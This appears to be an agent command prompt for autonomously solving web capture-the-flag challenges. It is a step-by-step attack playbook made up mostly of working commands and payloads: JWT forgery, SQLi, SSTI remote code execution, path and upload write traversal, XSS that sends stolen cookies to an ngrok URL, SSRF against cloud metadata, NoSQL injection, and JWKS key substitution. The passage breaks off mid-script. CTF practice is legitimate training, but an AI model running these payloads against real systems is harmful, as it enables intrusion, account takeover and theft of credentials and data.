Parse the arguments: $ARGUMENTS

Expected format (all optional after challenge-name):
  /ctf <platform> <target> <challenge-name> [username] [password]

Examples:
  /ctf htb 10.10.10.1 challenge-name
  /ctf htb 10.10.10.1:30406 challenge-name admin password123
  /ctf bugforge https://target.com challenge-name guest guest123

---

**Core principle: app-first.** Login → read JS → probe every endpoint → exploit what you find. Keep looping through attack surfaces until you hit a flag or exhaust everything.

---

## 1. Parse arguments

- platform: first arg (htb or bugforge). Default to htb if not provided.
- target: second arg (IP, IP:port, or URL). If it looks like a URL add http:// if missing.
- challenge-name: third arg. Sanitize to lowercase with hyphens.
- username: fourth arg (optional)
- password: fifth arg (optional)

Set flag format: htb → HTB{}, bugforge → bug{}, unknown → flag{}

Track auth state for the whole session:
- `AUTH_HEADER` — either `-H "Authorization: Bearer $TOKEN"` or `-b "session=<cookie>"` depending on what the app uses. Update this whenever you get a new token/cookie.
- `TOKEN` — raw token value if JWT
- `COOKIE` — raw cookie string if session-based

## 1.5. Source code review (HTB only)

If platform is `htb`, check for source code before doing anything else:

```bash
ls "/c/Tools/Source Code/<challenge-name>/" 2>/dev/null || echo "no source"
```

If the directory doesn't exist, also try fuzzy matches (HTB zip names don't always match the challenge name exactly):
```bash
ls "/c/Tools/Source Code/" | grep -i "<challenge-name>"
```

If source is found, read it immediately — this replaces most of the guesswork in steps 3–5.

**What to extract:**

1. **File tree** — understand the structure before reading individual files:
   ```bash
   find "/c/Tools/Source Code/<challenge-name>" -type f | sort
   ```

2. **Entry point and routes** — look for `app.js`, `index.js`, `app.py`, `main.py`, `routes/`, `controllers/`:
   - Every route definition → your complete endpoint list, skip JS harvest for discovery
   - HTTP methods per route → know exactly what's POST-able vs GET-only
   - Any route that reads a file, runs a command, or renders a template → immediate SSTI/traversal/RCE candidate

3. **Auth and JWT config** — look for `secret`, `JWT_SECRET`, `SECRET_KEY`, session config:
   ```bash
   grep -rE '(secret|SECRET|JWT_SECRET|SESSION_SECRET|key)\s*[=:]\s*["\x27][^"]{4,}' \
     "/c/Tools/Source Code/<challenge-name>/" 2>/dev/null
   ```
   A hardcoded JWT secret → go straight to step 3.5 with the known secret, skip cracking.

4. **Flag location** — find where the flag is stored or served:
   ```bash
   grep -rE '(flag|FLAG|HTB\{)' "/c/Tools/Source Code/<challenge-name>/" 2>/dev/null | grep -v '.min.js'
   ```
   Note the exact route and condition that returns it.

5. **Dangerous sinks** — functions that make source-code vulns obvious:
   ```bash
   grep -rE '(exec|eval|system|popen|render_template_string|subprocess|child_process|fs\.read|path\.join|file\.save|move_uploaded_file|shutil\.move)' \
     "/c/Tools/Source Code/<challenge-name>/" 2>/dev/null
   ```
   `file.save` / `move_uploaded_file` with an unsanitized filename → write traversal candidate (see 5.5-E.2).

6. **Database schema** — `schema.sql`, `models/`, `migrations/`: note table names, column names, any seed data containing flags or admin creds.

7. **Dockerfile / docker-compose.yml** — flag path, environment variables, exposed ports, base image.

**After reading source:**
- Update `AUTH_HEADER` state with any known secret/algorithm
- Build your endpoint list directly from routes — skip step 4 JS harvest for discovery (still do it if JS contains runtime-injected config)
- Note the exact vuln class the source points to and jump to that section of 5.5 first
- Record key findings in `notes.md ## Attack surface` before continuing

## 2. Launch recon script in the background

Feroxbuster and nuclei take 1-5 minutes. Don't wait on them — launch the script in the background and move straight to step 3 (login/registration). Login and register endpoints are known guesses, not something recon needs to discover first, so there's no dependency forcing you to wait.

```bash
mkdir -p /c/Tools/CTF/<challenge-name>/{recon,exploits,loot}
nohup bash /c/Tools/ctf-init.sh <target> <challenge-name> <platform> > /c/Tools/CTF/<challenge-name>/recon/_init.log 2>&1 &
```

This creates `/c/Tools/CTF/<challenge-name>/{recon,exploits,loot}`, writes `notes.md`, and (once finished) saves to `recon/`:
- `headers.txt`, `root.html` — header grab + root page
- `meta_hits.txt` — robots.txt, .env, .git/HEAD, etc. that returned non-404
- `quickcheck_hits.txt` — common admin/api/swagger/debug paths that returned non-404
- `ferox.txt` — full directory brute-force results
- `nuclei.txt` — only if platform is htb

**Do not block here.** Proceed immediately to step 3. Come back to check `_init.log` / `recon/` for completion before starting step 5 (endpoint probing) — by then the background job has almost always finished, since login/registration/JS-harvest takes comparable time.

When you do check back, read the output and note:
- `Server` / `X-Powered-By` → framework (Express, Flask, Laravel, Spring, Rails, etc.)
- `Set-Cookie` → cookie names, HttpOnly/Secure flags, session format
- Ferox hits that look like API routes, admin panels, or upload directories

If the script reports a flag match already, record it in notes.md and stop — no need to continue.

**Build a running endpoint list** from `meta_hits.txt`, `quickcheck_hits.txt`, and `ferox.txt` once available — every non-404 path in these files is a candidate endpoint. Merge it with whatever step 4 finds in JS, and probe all of it in step 5. Do not let these recon hits get dropped on the floor.

Append the script's findings into `notes.md` under `## Recon`.

## 3. Account access — login or register

Start this immediately after launching step 2's background job — do not wait for it.

### If credentials were provided, try common login endpoints:

```bash
curl -si -X POST <target>/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"<user>","password":"<pass>"}'

echo "---/api/login---"
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"<user>","password":"<pass>"}'

echo "---/auth---"
curl -si -X POST <target>/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"<user>","password":"<pass>"}'

echo "---/api/auth---"
curl -si -X POST <target>/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"<user>","password":"<pass>"}'
```

Also try form-encoded on each:
```bash
curl -si -X POST <target>/login -d 'username=<user>&password=<pass>'
```

### If no credentials were provided, try open registration:

```bash
curl -si -X POST <target>/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","email":"test@test.com","password":"Test1234!"}'

echo "---/api/register---"
curl -si -X POST <target>/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","email":"test@test.com","password":"Test1234!"}'

echo "---/api/signup---"
curl -si -X POST <target>/api/signup \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","email":"test@test.com","password":"Test1234!"}'
```

If registration works, immediately log in with those credentials and continue.

### After any successful auth:

Note the working endpoint, auth mechanism, and all user data returned (id, role, org, permissions).

**Set AUTH_HEADER based on response:**
- If Bearer token returned: `AUTH_HEADER='-H "Authorization: Bearer <token>"'`
- If Set-Cookie returned: `AUTH_HEADER='-b "<cookie-name>=<cookie-value>"'`

**Set YOUR_ID from the returned user object** (e.g. `id`, `userId`, `_id`) — this is required for the IDOR section in 5.5-A:
```bash
YOUR_ID=<id-from-login-response>
```
If the login/register response doesn't include an ID, fetch `/api/profile` or `/api/me` with `$AUTH_HEADER` right after auth and pull it from there.

If a JWT is returned, decode it immediately and **go to step 3.5 before anything else**:
```bash
python /c/Tools/jwt_tool/jwt_tool.py <token>
```

## 3.5. JWT fast-track (run immediately if JWT found in step 3)

Do not wait until step 6. Run these now in parallel:

```bash
# alg:none attack
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X a

# Secret crack against common passwords
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -C -d /c/Tools/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
```

If alg:none works or secret cracks, forge an escalated token immediately:
```bash
# Tamper mode — jwt_tool will prompt for claim edits; set role=admin, isAdmin=true, userId=1
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<cracked-secret>"
```

Update `AUTH_HEADER` with the forged token, then continue to step 4.

If neither attack works, note it and continue — return to full JWT work in step 6 if needed.

## 4. JS harvest and endpoint extraction

Fetch the authenticated root page and extract all script URLs:

```bash
curl -sk <target>/ $AUTH_HEADER -o /c/Tools/CTF/<challenge-name>/recon/root_auth.html
```

Parse all `<script src>` tags to find bundle paths:
```bash
python3 -c "
import re
with open('C:/Tools/CTF/<challenge-name>/recon/root_auth.html', 'r', errors='replace') as f:
    html = f.read()
scripts = re.findall(r'<script[^>]+src=[\"\'](.*?)[\"\'>', html)
for s in scripts:
    print(s)
"
```

Download every JS file found (adjust paths as needed):
```bash
curl -sk <target>/<script-path> -o /c/Tools/CTF/<challenge-name>/recon/<filename>.js
```

Parse each JS file:
```python
python3 -c "
import re, glob, os

js_dir = 'C:/Tools/CTF/<challenge-name>/recon/'
all_content = ''
for f in glob.glob(js_dir + '*.js'):
    with open(f, 'r', encoding='utf-8', errors='replace') as fh:
        all_content += fh.read() + '\n'

# API endpoints
endpoints = set(re.findall(r'[\"\'](/api/[a-zA-Z0-9/_\-?{}]+)[\"\']', all_content))
endpoints |= set(re.findall(r'[\"\'](/v[0-9]+/[a-zA-Z0-9/_\-?{}]+)[\"\']', all_content))
fetches = re.findall(r'(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*[\"\']([^\"\' ]+)', all_content)
endpoints |= set(fetches)
print('=== API ENDPOINTS ===')
for e in sorted(endpoints): print(e)

# Hardcoded secrets
print('\n=== POTENTIAL SECRETS ===')
secrets = re.findall(r'(?i)(?:password|secret|apikey|api_key|token|key)\s*[:=]\s*[\"\'`]([^\"\'`]{4,})[\"\'`]', all_content)
for s in set(secrets): print(s[:120])

# Comments with security keywords
print('\n=== INTERESTING COMMENTS ===')
for c in re.findall(r'//[^\n]{0,200}', all_content):
    if any(k in c.lower() for k in ['todo','fixme','password','admin','debug','flag','secret','hack','internal','bypass','note']):
        print(c[:200])

# GraphQL
print('\n=== GRAPHQL ===')
for g in set(re.findall(r'(?:query|mutation|subscription)\s+\w+[^{]*\{', all_content)):
    print(g[:200])

# Interesting string values (role names, feature flags, internal paths)
print('\n=== OTHER INTERESTING STRINGS ===')
for s in set(re.findall(r'[\"\']((?:admin|root|superuser|internal|debug|flag|/admin|/internal|/debug)[^\"\']{0,80})[\"\'`]', all_content, re.I)):
    print(s[:150])
"
```

Flag any interesting app content — user data, snippet bodies, descriptions, bios, config values referencing endpoints or auth mechanisms. These are direct hints and must be followed up in step 5 before anything else.

## 5. Probe all discovered endpoints

**Join point** — confirm the step 2 background job has finished before relying on `ferox.txt`/`nuclei.txt`:
```bash
jobs -l
# or: tail -5 /c/Tools/CTF/<challenge-name>/recon/_init.log
```
If it's still running, keep working other angles (step 5.5 sections that don't need it) and check back rather than blocking with a sleep loop.

Hit every endpoint found in step 4 with `$AUTH_HEADER`. Save each response to disk so later greps work.

```bash
# GET with auth — save response
curl -si <target>/api/<endpoint> $AUTH_HEADER \
  -o /c/Tools/CTF/<challenge-name>/recon/<endpoint-name>.json

# GET without auth — note if it returns data anyway
curl -si <target>/api/<endpoint>
```

For each response record:
- HTTP status and content-type
- All response body fields, especially ones not surfaced in the UI
- Numeric IDs, UUIDs, role strings, org IDs, permission arrays
- Any fields that look writable or injectable

Check OPTIONS to discover allowed methods:
```bash
curl -si -X OPTIONS <target>/api/<endpoint> $AUTH_HEADER
```

After all endpoints are probed, scan saved responses for a flag:
```bash
grep -rE 'HTB\{|bug\{|flag\{' /c/Tools/CTF/<challenge-name>/recon/ 2>/dev/null
```

**If flag found → record in notes.md and stop.**

## 5.5. Exploit decision tree

Run immediately after step 5. Work through every section that applies based on what was found. After each attempt, check the response for the flag pattern before moving on.

**If platform is `bugforge`** (or any web app challenge) and you're short on payload ideas for a given vuln class, pull from the AppSec notes vault before improvising — it has curated payloads/techniques beyond what's inlined below:

```bash
ls "/c/Obsidian notes/Pentesting notes/02-AppSec/"
```

Map the section you're stuck on to its folder and read the relevant notes:

| Section | Folder |
|---|---|
| A. IDOR | `13-Broken Access Control` |
| B. Mass assignment | `21-Application Logic and State Abuse` |
| C. SQLi | `07-SQL Injection` |
| D. SSTI | `14-Web Attacks` |
| E. Path traversal | `15-File Inclusion` |
| E.2. File upload | `09-File Upload Attacks` |
| F. GraphQL | `18-Web Service & API Attacks` |
| G. Auth bypass | `12-Broken Authentication` |
| H. XSS | `06-Cross-Site Scripting (XSS)` |
| I. SSRF | `10-Server-side Attacks` |
| J. Business logic | `21-Application Logic and State Abuse` |
| K. NoSQL injection | `20-NoSQL Injection` |
| L. JSON anomalies | `17-Session Security`, `21-Application Logic and State Abuse` |
| Recon/fuzzing gaps | `04-Information Gathering and Fuzzing - Web Edition` |
| Headers/CORS/CSP | `23-Headers and CSP` |
| WAF blocking payloads | `WAF Bypass.md` |

Search across the whole vault when unsure which folder applies:
```bash
grep -rli "<keyword>" "/c/Obsidian notes/Pentesting notes/02-AppSec/" 2>/dev/null
```

Treat these as idea/technique references, not a replacement for testing against the live target — adapt payloads to the app's actual framework/language.

---

### A. IDOR — numeric IDs or UUIDs in responses or URLs

```bash
# Enumerate adjacent IDs
for id in 0 1 2 3 100 999 9999; do
  echo "=== id=$id ==="
  curl -si "<target>/api/<endpoint>/$id" $AUTH_HEADER
done

# Nil UUID
curl -si "<target>/api/<endpoint>/00000000-0000-0000-0000-000000000000" $AUTH_HEADER

# Your own ID ±1 (most likely to expose a neighbour)
curl -si "<target>/api/<endpoint>/$((YOUR_ID - 1))" $AUTH_HEADER
curl -si "<target>/api/<endpoint>/$((YOUR_ID + 1))" $AUTH_HEADER
```

---

### B. Mass assignment — role/privilege fields in responses

If a response contains `role`, `isAdmin`, `admin`, `permissions`, `tier`, `plan`:

```bash
# Inject on profile update
curl -si -X PUT <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin","isAdmin":true,"admin":true}'

# Inject on registration (re-register with elevated fields)
curl -si -X POST <target>/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker2","email":"a2@test.com","password":"Test1234!","role":"admin","isAdmin":true}'

# Inject on any PATCH endpoint
curl -si -X PATCH <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

After each attempt, re-fetch your profile and re-probe all previously 403'd endpoints with `$AUTH_HEADER`.

---

### C. SQLi — search, filter, login, or ID parameters

Quick probe first:
```bash
curl -si "<target>/api/search?q=test'" $AUTH_HEADER
curl -si "<target>/api/search?q=1+OR+1=1--" $AUTH_HEADER
curl -si "<target>/api/items/1'" $AUTH_HEADER
```

If any returns a DB error, different row count, or different response length — hand to sqlmap:
```bash
python /c/Tools/sqlmap/sqlmap.py \
  -u "<target>/api/search?q=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level 2 --risk 2 --dbs \
  --output-dir /c/Tools/CTF/<challenge-name>/exploits/sqlmap

# For cookie auth:
python /c/Tools/sqlmap/sqlmap.py \
  -u "<target>/api/search?q=test" \
  --cookie="<cookie-name>=<cookie-value>" \
  --batch --level 2 --risk 2 --dbs \
  --output-dir /c/Tools/CTF/<challenge-name>/exploits/sqlmap
```

---

### D. SSTI — any input that gets rendered back

Probe all major engines in one shot:
```bash
for payload in '%7B%7B7*7%7D%7D' '%24%7B7*7%7D' '%3C%25%3D+7*7+%25%3E' '%23%7B7*7%7D'; do
  echo "=== $payload ==="
  curl -si "<target>/api/<endpoint>?field=$payload" $AUTH_HEADER
done
```

For POST bodies (saves quoting issues):
```bash
python3 -c "
import subprocess, json

target = '<target>/api/<endpoint>'
token = '<token>'
payloads = ['{{7*7}}', '\${7*7}', '<%= 7*7 %>', '#{7*7}', '{{7*\"7\"}}']

for p in payloads:
    result = subprocess.run(
        ['curl', '-si', '-X', 'POST', target,
         '-H', f'Authorization: Bearer {token}',
         '-H', 'Content-Type: application/json',
         '-d', json.dumps({'field': p})],
        capture_output=True, text=True
    )
    if '49' in result.stdout or '7777777' in result.stdout:
        print(f'[HIT] {p}')
        print(result.stdout[:500])
    else:
        print(f'[miss] {p}')
"
```

If `49` appears in the response:
```bash
# Jinja2 RCE
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"field":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /flag.txt\").read()}}"}'

# Jinja2 — try common flag paths
for flagpath in '/flag.txt' '/flag' '/root/flag.txt' '/app/flag.txt' '/data/flag.txt'; do
  echo "=== $flagpath ==="
  curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
    -H 'Content-Type: application/json' \
    -d "{\"field\":\"{{config.__class__.__init__.__globals__['os'].popen('cat $flagpath').read()}}\"}"
done

# Twig RCE
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"field":"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag.txt\")}}"}'

# Freemarker RCE
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"field":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag.txt\")}"}'
```

---

### E. Path traversal — file name or path parameters

```bash
# Standard
curl -si "<target>/api/file?name=../../../etc/passwd" $AUTH_HEADER

# Four-dot double-slash bypass
curl -si "<target>/api/file?name=....//....//....//etc/passwd" $AUTH_HEADER

# URL double-encode
curl -si "<target>/api/file?name=..%252f..%252f..%252fetc%252fpasswd" $AUTH_HEADER

# Null byte
curl -si "<target>/api/file?name=../../../etc/passwd%00.txt" $AUTH_HEADER

# Unicode / overlong encoding
curl -si "<target>/api/file?name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" $AUTH_HEADER
```

Once traversal works, try common flag locations:
```bash
for f in '/flag.txt' '/flag' '/root/flag.txt' '/home/user/flag.txt' '/app/flag.txt' '/data/flag.txt' '/var/flag.txt'; do
  echo "=== $f ==="
  curl -si "<target>/api/file?name=....//....//..../$f" $AUTH_HEADER
done
```

---

### E.2. File upload write traversal — unsanitized filename in upload endpoint

If the app accepts file uploads and passes the filename directly to a save function (e.g. `file.save(UPLOAD_DIR + "/" + filename)`), the filename is a write-traversal sink. Overwriting server-side key/config files is often the fastest privilege escalation path.

```bash
# Probe: does the server accept path separators in the filename?
# A 200/302 (not 400/422/500) means traversal likely landed
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@/dev/null;filename=../canary.txt"

# If accepted, identify the app's JWKS path (check source or well-known URL):
curl -s <target>/static/.well-known/jwks.json && echo "JWKS found"
curl -s <target>/.well-known/jwks.json && echo "JWKS found at root"

# Depth depends on where UPLOADS_DIR sits relative to the target file.
# /app/uploads/ → /app/static/.well-known/jwks.json = one level up: ../static/.well-known/jwks.json
# /app/uploads/ → /static/.well-known/jwks.json     = two levels up: ../../static/.well-known/jwks.json
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"

# Verify overwrite succeeded
curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool
```

Other high-value overwrite targets (try after JWKS if JWT isn't the auth mechanism):
```bash
# .env — may contain DB creds or secrets read at runtime
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/evil.env;filename=../.env"

# Template file — if app renders server-side templates, overwrite with SSTI payload
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
```

If JWKS overwrite lands → go to step 6 (JWKS substitution) immediately.

---

### F. GraphQL

```bash
# Introspection — find all types and fields
curl -si -X POST <target>/graphql $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name args { name } } } } }"}'

# Fetch all users including sensitive fields
curl -si -X POST <target>/graphql $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id username role email password flag } }"}'

# Try unauthenticated
curl -si -X POST <target>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id username role flag } }"}'

# Batch query (rate limit bypass, IDOR)
curl -si -X POST <target>/graphql $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '[{"query":"{ user(id: 1) { flag } }"},{"query":"{ user(id: 2) { flag } }"},{"query":"{ user(id: 3) { flag } }"}]'

# Mutation — try privilege escalation
curl -si -X POST <target>/graphql $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { updateUser(id: \"<your-id>\", role: \"admin\") { id role } }"}'
```

---

### G. Auth bypass — 401/403 endpoints

```bash
# No token
curl -si <target>/api/admin/

# Empty / null token
curl -si <target>/api/admin/ -H "Authorization: Bearer "
curl -si <target>/api/admin/ -H "Authorization: Bearer null"
curl -si <target>/api/admin/ -H "Authorization: Bearer undefined"

# admin:admin basic auth
curl -si <target>/api/admin/ -H "Authorization: Basic YWRtaW46YWRtaW4="

# Method override
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "X-HTTP-Method-Override: GET"
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "_method: GET"

# Path normalization tricks
curl -si "<target>/api/admin/..%2fusers" $AUTH_HEADER
curl -si "<target>/api/./admin/users" $AUTH_HEADER
curl -si "<target>/API/admin/users" $AUTH_HEADER
```

---

### H. XSS + bot — report/submit-for-review features

If the app has an "admin reviews your submission" workflow, a report link, or a contact/feedback form:

```bash
# Start ngrok to catch the cookie
/c/Tools/Ngrok/ngrok.exe http 8080 &
# Note your ngrok URL e.g. https://abc123.ngrok-free.app

# Basic cookie steal
curl -si -X POST <target>/api/report $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"https://<ngrok-url>/?c=\"+document.cookie)</script>"}'

# img onerror variant (bypasses script-tag filters)
curl -si -X POST <target>/api/report $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"content":"<img src=x onerror=\"fetch('"'"'https://<ngrok-url>/?c='"'"'+document.cookie)\">"}'

# fetch with full headers (for httponly cookie workarounds)
curl -si -X POST <target>/api/report $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"/api/flag\").then(r=>r.text()).then(t=>fetch(\"https://<ngrok-url>/?d=\"+btoa(t)))</script>"}'
```

Watch ngrok output for incoming requests. If a cookie arrives, use it as `$AUTH_HEADER` and re-probe all endpoints.

---

### I. SSRF — URL or callback parameters

```bash
# Localhost / internal services
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'

# Common internal ports
for port in 80 443 8080 8443 3000 3306 5432 6379 9200; do
  echo "=== port $port ==="
  curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}"
done

# Cloud metadata
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'

# OOB — confirm SSRF with ngrok before probing internal
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://<ngrok-url>/ssrf-test"}'
```

---

### J. Business logic

```bash
# Negative price / quantity
curl -si -X POST <target>/api/cart $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"item_id":1,"quantity":-100,"price":-99.99}'

# Skip workflow step — go straight to final confirmation
curl -si -X POST <target>/api/order/complete $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"order_id":"<id>"}'

# Race condition on single-use codes/vouchers
for i in $(seq 1 15); do
  curl -si -X POST <target>/api/redeem $AUTH_HEADER \
    -H 'Content-Type: application/json' \
    -d '{"code":"VOUCHER"}' &
done; wait

# Integer overflow on balances
curl -si -X POST <target>/api/transfer $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"to":"admin","amount":9999999999}'

# HTTP parameter pollution — duplicate params; server may use first, last, or array
curl -si "<target>/api/transfer?to=admin&amount=1000&amount=0" $AUTH_HEADER
curl -si -X POST <target>/api/transfer $AUTH_HEADER \
  -d 'to=admin&amount=1000&amount=0'

# Email/username case normalization — register Admin@x.com, login as admin@x.com
# Some apps normalize on login but not on lookup, creating a shadow account
curl -si -X POST <target>/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"Admin","email":"Admin@test.com","password":"Test1234!"}'
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","email":"admin@test.com","password":"Test1234!"}'
```

---

### K. NoSQL injection — MongoDB `$gt`/`$ne`/`$regex` operators

Trigger: app uses MongoDB (check `package.json` for `mongoose`/`mongodb`, or Python `pymongo`). Any login or filter field that passes user input directly to a query is injectable.

```bash
# Auth bypass — password not-equal to empty string (always true)
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}'

# Auth bypass — username regex wildcard
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$regex":".*"},"password":{"$ne":""}}'

# Auth bypass via form-encoded (PHP/Express may cast array to object)
curl -si -X POST <target>/api/login \
  -d 'username=admin&password[$ne]=x'

# Extract field value blind — brute character by character
# Replace 'password' with whatever field you want (flag, token, secretKey)
python3 << 'EOF'
import requests, string

target = "<target>/api/login"
charset = string.ascii_letters + string.digits + "_{}-"
known = ""

while True:
    found = False
    for c in charset:
        payload = {"username": "admin", "password": {"$regex": f"^{known}{c}"}}
        r = requests.post(target, json=payload, verify=False)
        if r.status_code == 200 and "wrong" not in r.text.lower() and "invalid" not in r.text.lower():
            known += c
            print(f"[+] {known}")
            found = True
            break
    if not found:
        print(f"[done] {known}")
        break
EOF

# Filter/search endpoint — inject $where for JS execution (older MongoDB)
curl -si "<target>/api/users?filter[$where]=sleep(2000)" $AUTH_HEADER
```

---

### L. JSON anomalies & type confusion

Run on any POST/PUT/PATCH endpoint that parses JSON. These require no prior knowledge — fire them against login, register, and update endpoints.

```bash
# Duplicate keys — behavior is parser-dependent (last-wins in JS, first-wins in Python)
# Useful when role/permission check reads key[0] but backend logic reads key[1]
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  --data-binary '{"username":"attacker","role":"user","role":"admin"}'

# Type confusion — send boolean/int where string is expected
# Loose equality checks (PHP ==, JS ==) may treat true as any truthy string
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":true}'

curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":1}'

# Null injection — may bypass presence checks or short-circuit comparisons
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":null}'

# Array wrapping — some frameworks cast ["admin"] to "admin" (PHP, some Node middleware)
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":["admin"],"password":["anyvalue"]}'

# Prototype pollution (Node.js) — poisons Object.prototype for all objects in process
# Useful when app does: if (user.isAdmin) { ... } and isAdmin is never set
curl -si -X POST <target>/api/settings $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

curl -si -X POST <target>/api/settings $AUTH_HEADER \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# After prototype pollution attempt, re-probe admin endpoints immediately
curl -si <target>/api/admin/ $AUTH_HEADER

# Content-type switch — some apps parse body differently per Content-Type
# Try sending JSON body with form Content-Type and vice versa
curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d '{"username":"admin","password":"admin"}'

curl -si -X POST <target>/api/login \
  -H 'Content-Type: application/json' \
  -d 'username=admin&password=admin'
```

---

## 6. JWT deep-dive (if step 3.5 didn't crack it)

```bash
# RS256 → HS256 confusion (sign with server's public key as HMAC secret)
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk /c/Tools/CTF/<challenge-name>/recon/pubkey.pem

# kid injection (if kid header present)
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"

# Full tamper with known secret
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
```

Re-probe all 403'd endpoints with forged token after each attempt.

### JWKS substitution (if file upload write traversal succeeded in E.2)

When you can overwrite the server's JWKS file, you own JWT issuance entirely — generate your own RSA pair, publish the public key as the new JWKS, sign tokens for any user.

```python
# Step 1 — generate RSA key pair + JWKS file
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, os

os.makedirs('C:/Tools/CTF/<challenge-name>/exploits', exist_ok=True)
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = private_key.public_key().public_numbers()

def b64u(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l, 'big')).rstrip(b'=').decode()

kid = "pwned"
jwks = {"keys": [{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}

with open('C:/Tools/CTF/<challenge-name>/exploits/private_key.pem', 'wb') as f:
    f.write(private_key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
with open('C:/Tools/CTF/<challenge-name>/exploits/jwks.json', 'w') as f:
    json.dump(jwks, f)
print("Done. KID:", kid)
EOF
```

```bash
# Step 2 — overwrite server JWKS via write traversal (see E.2 for depth/path)
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"

# Verify
curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool
```

```python
# Step 3 — forge JWT for target user (get their UUID/id via SQLi or IDOR first)
python3 << 'EOF'
import jwt
